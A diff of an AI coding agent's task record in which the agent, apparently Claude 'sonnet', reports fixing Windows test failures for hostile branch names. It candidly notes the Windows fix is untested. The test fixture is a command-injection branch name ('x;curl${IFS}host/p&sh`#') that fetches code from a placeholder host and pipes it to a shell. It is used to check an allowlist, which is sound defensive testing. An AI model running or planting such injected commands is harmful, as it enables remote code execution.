@@ -5,7 +5,7 @@
   "roleTask": "Worker.implementation",
   "slug": "make-the-hostile-branch-name-tests-in",
   "objective": "Make the hostile-branch-name tests in cloud-checkout.test.ts pass on Windows without weakening them.",
-  "state": "Running",
+  "state": "Succeeded",
   "scope": [
     "Work only in /home/user/holyagent-0.3.0-cloudbranch (branch release/0.3.0/fix/cloud-session-branch, PR #95). The Windows CI job fails two tests: 'is not shown when the start branch is refused and the checkout is on the branch it would name' and 'names only a branch of plain characters, else the default branch'. git cannot create the ref 'refs/heads/x;curl${IFS}host/p|sh`#' on NTFS: 'cannot lock ref ... .lock: Invalid argument', because | (and < > : \" \\ ? *) are invalid in Windows file names. The full log is /tmp/claude-0/-home-user-holyagent/43946df6-456d-58c6-bea3-7e958fcb9495/scratchpad/win95.log (lines 730-790).",
     "Choose a hostile name valid as a file name on Windows, macOS and Linux that still fails the notice's allowlist for the same reason (shell metacharacters such as ; $ {{ }} & backtick #), and use it in both tests and both sources (reflog and origin/HEAD); explain the choice in a short comment. Keep every assertion. Do not skip or platform-gate the tests."
@@ -46,7 +46,9 @@
     "agentId": "workflow:wf_700b67c4-254/assignment-0mw9ath7t-ply1",
     "model": "sonnet",
     "effort": "high",
-    "startedAt": "2026-11-09T13:30:11.945Z"
+    "startedAt": "2026-11-09T13:30:11.945Z",
+    "finishedAt": "2026-11-09T13:33:13.846Z"
   },
+  "result": "result: Both tests now use `x;curl${IFS}host/p&sh\\`#`. I replaced `|`, the only character git cannot create as a ref on NTFS, with `&`. I did not run the tests on Windows, so the fix there is untested.\nchanged: /home/user/holyagent-0.3.0-cloudbranch/packages/runtime/tests/cloud-checkout.test.ts\nchecks:\n`bun install --frozen-lockfile` -> exit 0\n`bunx --no-install mise run build` -> exit 0, `git status` afterwards shows only the test file modified\n`bunx --no-install mise run verify` -> exit 0, 2531 pass, 0 fail, 82 files\nblockers: none\nquestions: none\nnotes:\nThe name is now one shared `HOSTILE` constant with an explanatory comment, used by both tests and by both sources (the reflog branch and `origin/HEAD`). I kept every assertion, including the `curl` checks.\nThe name still fails the allowlist (`SAFE_BRANCH` in `status.ts`) because of `;`, `$`, `{`, `}`, `&`, backtick and `#`.\nDiff file: /tmp/claude-0/-home-user-holyagent/43946df6-456d-58c6-bea3-7e958fcb9495/scratchpad/ply1.diff\nevidence:\nBoth tests use a hostile name that git can create on Windows and that the allowlist still rejects, with every assertion kept: `HOSTILE` in `cloud-checkout.test.ts` lines 15-18, used at lines 112 and 133 and in the `origin/HEAD` source. The diff file shows no assertion changed.\nmise run build leaves no unexplained changes and mise run verify exits 0: build exit 0 with only the test file changed, verify exit 0 with 2531 pass and 0 fail.\ndiff-file: /tmp/claude-0/-home-user-holyagent/43946df6-456d-58c6-bea3-7e958fcb9495/scratchpad/ply1.diff\ngates: `bunx --no-install mise run build` exit 0; `bunx --no-install mise run verify` exit 0, 2531 pass, 0 fail.\n",
   "createdAt": "2026-11-09T13:30:11.945Z"
 }
